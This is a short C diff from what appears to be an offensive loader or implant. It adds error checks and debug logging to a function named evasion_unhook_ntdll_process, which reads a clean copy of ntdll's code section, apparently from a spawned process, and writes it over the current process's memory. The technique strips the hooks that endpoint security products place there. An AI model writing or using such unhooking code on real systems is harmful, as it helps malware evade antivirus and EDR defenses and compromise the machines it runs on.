@@ -57,9 +57,15 @@ BOOL evasion_unhook_ntdll_process(void) {
             g_ldr->apis->ReadProcessMemory(pi.hProcess, textAddr, clean, textSize, &bytesRead);
 
             DWORD old = 0;
-            g_ldr->apis->VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &old);
+            BOOL check = g_ldr->apis->VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &old);
+            if (!check) {
+                DBGA("VirtualProtect 1 failed: %lu\n", GetLastError());
+            }
             memcpy(textAddr, clean, textSize);
-            g_ldr->apis->VirtualProtect(textAddr, textSize, old, &old);
+            check = g_ldr->apis->VirtualProtect(textAddr, textSize, old, &old);
+            if (!check) {
+                DBGA("VirtualProtect 2 failed: %lu\n", GetLastError());
+            }
 
             g_ldr->apis->LocalFree(clean);
             break;
